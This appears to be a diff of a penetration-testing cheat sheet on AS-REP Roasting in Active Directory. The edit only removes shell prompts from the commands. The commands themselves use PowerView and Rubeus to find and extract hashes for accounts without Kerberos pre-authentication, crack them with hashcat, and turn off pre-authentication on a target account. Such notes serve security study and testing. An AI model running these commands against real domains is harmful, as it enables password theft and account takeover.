@@ -13,14 +13,14 @@
 - PowerView can be used to enumerate users with their `UserAccountControl` (UAC) property flag set to `DONT_REQ_PREAUTH`.
 
 ```powershell
-PS C:\Tools> Import-Module .\PowerView.ps1
-PS C:\Tools> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+Import-Module .\PowerView.ps1
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
 - We can also use rubeus
 
 ```powershell
-PS C:\Tools> .\Rubeus.exe asreproast /format:hashcat /nowrap
+.\Rubeus.exe asreproast /format:hashcat /nowrap
 ```
 
 > By default, Rubeus outputs hashes for John the Ripper.  Use /format:hashcat to output them for Hashcat instead.
@@ -29,16 +29,16 @@ PS C:\Tools> .\Rubeus.exe asreproast /format:hashcat /nowrap
 
 ```powershell
 # Get the TGT of user
-PS C:\Tools> .\Rubeus.exe asreproast /user: /domain: /dc: /nowrap /outfile:hashes.txt
+.\Rubeus.exe asreproast /user: /domain: /dc: /nowrap /outfile:hashes.txt
 # Crack the hash
-C:\Tools\> .\hashcat.exe -m 18200 .\hashes.txt .\rockyou.txt -O
+.\hashcat.exe -m 18200 .\hashes.txt .\rockyou.txt -O
 ```
 
 - If we have `GenericWrite` or `GenericAll` permissions over an account, we can enable this attribute and obtain the AS_REP ticket for offline cracking to recover the account's password. This can also be referred to as a `targeted AS-REPRoasting attack`.
 
 ```powershell
-PS C:\Tools> Import-Module .\PowerView.ps1
-PS C:\Tools> Set-DomainObject -Identity <userName> -XOR @{useraccountcontrol=4194304} -Verbose
+Import-Module .\PowerView.ps1
+Set-DomainObject -Identity <userName> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
 ## Exploitation from Linux
